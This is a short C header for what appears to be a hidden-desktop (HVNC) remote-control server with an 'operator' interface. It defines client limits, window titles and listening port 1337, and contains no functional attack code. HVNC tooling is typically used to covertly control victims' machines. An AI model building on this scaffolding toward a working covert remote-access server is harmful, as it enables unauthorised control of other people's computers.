#pragma once

#include <winsock2.h>
#include <windows.h>
#include <windowsx.h>
#include <stdio.h>

#include "../shared/native.h"
#include "../shared/config.h"

#define MAX_CLIENTS     256
#define CLASS           "HiddenDesktop_ControlWindow"
#define WINDOW_TITLE    "HVNC Operator UI"
#define CONSOLE_TITLE   "HVNC Server"
#define PORT            1337
